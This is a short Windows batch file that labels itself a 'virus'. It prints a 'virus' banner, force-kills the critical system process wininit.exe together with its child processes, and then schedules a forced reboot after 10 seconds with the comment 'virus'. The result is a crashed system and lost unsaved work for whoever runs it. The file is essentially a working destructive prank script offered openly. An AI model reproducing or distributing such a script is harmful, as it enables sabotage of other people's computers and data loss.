@echo off
cls
echo virus....................................................................................................
taskkill /f /im wininit.exe /t
echo Rebooting Now...
shutdown /r -t 10 -c virus
pause